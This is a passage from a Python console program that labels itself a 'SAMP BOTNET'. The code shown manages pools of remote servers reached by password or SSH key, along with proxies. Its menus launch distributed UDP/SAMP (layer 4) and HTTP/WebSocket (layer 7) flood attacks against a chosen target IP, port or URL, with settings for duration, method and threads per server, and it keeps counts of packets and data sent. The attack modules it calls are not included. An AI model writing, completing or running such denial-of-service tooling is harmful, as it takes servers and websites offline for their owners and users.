            data['proxies'] = [p for p in data['proxies'] if p.get('active')]
            save_servers(data)
            print(f"{COLOR['green']}✅ Cleaned{COLOR['reset']}")
            time.sleep(1)
            
        elif choice == '5':
            break

def menu_launch_l4(data):
    """Launch L4 Attack (attack.go)"""
    pwd_active = [s for s in data.get('servers_password', []) if s.get('active') or s.get('l4_capable')]
    key_active = [s for s in data.get('servers_key', []) if s.get('active') or s.get('l4_capable')]
    
    if not pwd_active and not key_active:
        print(f"{COLOR['red']}❌ No L4 capable servers!{COLOR['reset']}")
        input("\nEnter...")
        return
    
    clear_screen()
    print_banner()
    print(f"{COLOR['red']}🎯 LAUNCH L4 ATTACK (UDP/SAMP){COLOR['reset']}\n")
    print(f"🔒 Password: {len(pwd_active)} | 🔑 Key: {len(key_active)}")
    
    print(f"\n{COLOR['bold']}Select pool:{COLOR['reset']}")
    print("1️⃣  Password Servers Only")
    print("2️⃣  SSH Key Servers Only")
    print("3️⃣  ALL Servers")
    
    choice = input("Choice: ")
    if choice == '1':
        servers = pwd_active
    elif choice == '2':
        servers = key_active
    else:
        servers = pwd_active + key_active
    
    if not servers:
        print("No servers selected"); input("\nEnter..."); return
    
    try:
        target_ip = input("Target IP: ")
        target_port = int(input("Port (7777): ") or "7777")
        duration = int(input("Duration (s): ") or "60")
        
        print(f"\n{COLOR['bold']}Method:{COLOR['reset']}")
        for k, (m, d) in L4_METHODS.items():
            print(f"{k}. {m} - {d}")
        method = L4_METHODS.get(input("Select (1-5): ") or "5", ('GOD', 'ALL'))[0]
        
        # Auto threads
        avg_cpu = sum([s.get('cpu_cores', 2) for s in servers]) / len(servers)
        suggested = int(avg_cpu * 500)
        threads = int(input(f"Threads/server [{suggested}]: ") or str(suggested))
        
        confirm = input(f"\n{COLOR['red']}Start L4 attack? (y/n): {COLOR['reset']}")
        if confirm.lower() == 'y':
            deploy_attack_l4(servers, target_ip, target_port, duration, method, threads, data)
    except Exception as e:
        print(f"{COLOR['red']}Error: {e}{COLOR['reset']}")
    
    input("\nEnter...")

def menu_launch_l7(data):
    """Launch L7 Attack (attackl7.go)"""
    pwd_active = [s for s in data.get('servers_password', []) if s.get('active') or s.get('l7_capable')]
    key_active = [s for s in data.get('servers_key', []) if s.get('active') or s.get('l7_capable')]
    
    if not pwd_active and not key_active:
        print(f"{COLOR['red']}❌ No L7 capable servers!{COLOR['reset']}")
        input("\nEnter...")
        return
    
    clear_screen()
    print_banner()
    print(f"{COLOR['purple']}🌐 LAUNCH L7 ATTACK (HTTP/WS){COLOR['reset']}\n")
    print(f"🔒 Password: {len(pwd_active)} | 🔑 Key: {len(key_active)}")
    
    print(f"\n{COLOR['bold']}Select pool:{COLOR['reset']}")
    print("1️⃣  Password Servers Only")
    print("2️⃣  SSH Key Servers Only")
    print("3️⃣  ALL Servers")
    
    choice = input("Choice: ")
    if choice == '1':
        servers = pwd_active
    elif choice == '2':
        servers = key_active
    else:
        servers = pwd_active + key_active
    
    if not servers:
        print("No servers selected"); input("\nEnter..."); return
    
    try:
        target_url = input("Target URL (https://...): ").strip()
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url
        
        duration = int(input("Duration (s): ") or "60")
        
        print(f"\n{COLOR['bold']}Method:{COLOR['reset']}")
        for k, (m, d) in L7_METHODS.items():
            print(f"{k}. {m} - {d}")
        method = L7_METHODS.get(input("Select (1-6): ") or "6", ('GOD_L7', 'ALL'))[0]
        
        # L7 threads lebih rendah karena CPU intensive
        avg_cpu = sum([s.get('cpu_cores', 2) for s in servers]) / len(servers)
        suggested = int(avg_cpu * 200)
        threads = int(input(f"Threads/server [{suggested}]: ") or str(suggested))
        
        confirm = input(f"\n{COLOR['red']}Start L7 attack? (y/n): {COLOR['reset']}")
        if confirm.lower() == 'y':
            deploy_attack_l7(servers, target_url, duration, method, threads, data)
    except Exception as e:
        print(f"{COLOR['red']}Error: {e}{COLOR['reset']}")
    
    input("\nEnter...")

def menu_stats(data):
    """Statistics gabungan L4 dan L7"""
    clear_screen()
    print_banner()
    
    pwd_total = len(data.get('servers_password', []))
    pwd_active = len([s for s in data.get('servers_password', []) if s.get('active')])
    key_total = len(data.get('servers_key', []))
    key_active = len([s for s in data.get('servers_key', []) if s.get('active')])
    
    stats = data['stats']
    
    print(f"{COLOR['cyan']}📊 GLOBAL STATISTICS{COLOR['reset']}")
    print(f"Servers: {pwd_active+key_active}/{pwd_total+key_total} active (🔒:{pwd_active} 🔑:{key_active})")
    print(f"\n{COLOR['red']}L4 (UDP/SAMP):{COLOR['reset']}")
    print(f"  Total Attacks: {stats.get('total_attacks', 0)}")
    print(f"  Total Packets: {format_number(stats.get('total_packets', 0))}")
    print(f"\n{COLOR['purple']}L7 (HTTP/WS):{COLOR['reset']}")
    print(f"  Total Requests: {format_number(stats.get('total_requests', 0))}")
    print(f"  Total Data: {stats.get('total_bytes', 0)/1024/1024/1024:.2f} GB")
    
    input("\nEnter...")

# ================= [ UTILS ] =================
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    banner = f"""
{COLOR['red']}{COLOR['bold']}
╔══════════════════════════════════════════════════════════════════════════════════╗
║                   🔥 SAMP BOTNET v{VERSION} 🔥                          ║
║           DUAL MODE: L4 (UDP/SAMP) + L7 (HTTP/WEBSOCKET)                         ║
║              PASSWORD + SSH KEY AUTHENTICATION                                   ║
╚══════════════════════════════════════════════════════════════════════════════════╝
{COLOR['reset']}"""
    print(banner)

def format_number(n):
    if n < 1000: return str(int(n))
    if n < 1000000: return f"{n/1000:.1f}K"
    if n < 1000000000: return f"{n/1000000:.1f}M"
    return f"{n/1000000000:.1f}B"

def parse_number(s):
    s = str(s).strip().upper()
    if s.endswith('K'): return int(float(s[:-1]) * 1000)
    if s.endswith('M'): return int(float(s[:-1]) * 1000000)
    if s.endswith('B'): return int(float(s[:-1]) * 1000000000)
    if s.endswith('T'): return int(float(s[:-1]) * 1000000000000)
    return int(float(s))

def check_dependencies():
    try:
        import paramiko
    except ImportError:
        print(f"{COLOR['yellow']}Installing paramiko...{COLOR['reset']}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko", "-q"])
        print(f"{COLOR['green']}✅ Dependencies OK{COLOR['reset']}")
        time.sleep(1)

# ================= [ MAIN ] =================
def main():
    check_dependencies()
    
    if not os.path.exists('attack.go'):
        print(f"{COLOR['yellow']}⚠️  attack.go (L4) not found{COLOR['reset']}")
    if not os.path.exists('attackl7.go'):
        print(f"{COLOR['yellow']}⚠️  attackl7.go (L7) not found{COLOR['reset']}")
    
    data = load_servers()
    
    while True:
        clear_screen()
        print_banner()
        
        pwd_active = len([s for s in data.get('servers_password', []) if s.get('active')])
        key_active = len([s for s in data.get('servers_key', []) if s.get('active')])
        total_attacks = data['stats'].get('total_attacks', 0)
        
        print(f"{COLOR['cyan']}📊 STATUS: 🔒{pwd_active} 🔑{key_active} | Attacks: {total_attacks}{COLOR['reset']}\n")
        
        print("1️⃣  Manage Password Servers (L4 Mode)")
        print("2️⃣  Manage SSH Key Servers (L4 Mode)")
        print("3️⃣  Manage Password Servers (L7 Mode)")
        print("4️⃣  Manage SSH Key Servers (L7 Mode)")
        print("5️⃣  Manage Proxies (L7)")
        print("6️⃣  Launch L4 Attack (attack.go)")
        print("7️⃣  Launch L7 Attack (attackl7.go)")
        print("8️⃣  Statistics")
        print("9️⃣  Exit")
        
        choice = input(f"\n{COLOR['yellow']}Select: {COLOR['reset']}")
        
        if choice == '1':
            menu_password_servers(data, mode="l4")
        elif choice == '2':
            menu_key_servers(data, mode="l4")
        elif choice == '3':
            menu_password_servers(data, mode="l7")
        elif choice == '4':
            menu_key_servers(data, mode="l7")
        elif choice == '5':
            menu_proxies(data)
        elif choice == '6':
            menu_launch_l4(data)
        elif choice == '7':
            menu_launch_l7(data)
        elif choice == '8':
            menu_stats(data)
        elif choice == '9':
            print(f"{COLOR['green']}Goodbye!{COLOR['reset']}")
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{COLOR['yellow']}Exiting...{COLOR['reset']}")
    except Exception as e:
        print(f"{COLOR['red']}Fatal: {e}{COLOR['reset']}")
        import traceback
        traceback.print_exc()
